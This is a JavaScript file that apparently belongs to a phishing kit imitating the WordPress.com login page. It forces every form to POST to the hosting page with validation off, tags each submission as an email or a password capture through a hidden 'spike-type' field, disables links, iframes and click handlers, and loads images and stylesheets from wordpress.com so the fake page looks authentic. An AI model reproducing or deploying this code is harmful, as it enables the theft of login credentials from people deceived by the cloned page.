let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = true
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})


document.querySelectorAll("link").forEach(li => {
    let prev = li.href
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.href = `https://wordpress.com${prev}`
    }
})

document.querySelectorAll("img").forEach(li => {
    let prev = li.src
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.src = `https://wordpress.com${prev}`
    }
})

// sets
let usernameOrEmail = document.querySelector("#usernameOrEmail")
let passwordCont = document.querySelector(".login__form-password")

if (usernameOrEmail && passwordCont) {
    if (passwordCont.classList == 'login__form-password is-hidden') {
        addSpikeType("email")
    } else if (passwordCont.classList == 'login__form-password') {
        addSpikeType("password")
    }
}


// functions
let changeUser = document.querySelector(".login__form-change-username")
if (changeUser) {
    changeUser.addEventListener("click", () => {
        location.href = location.href
    })
}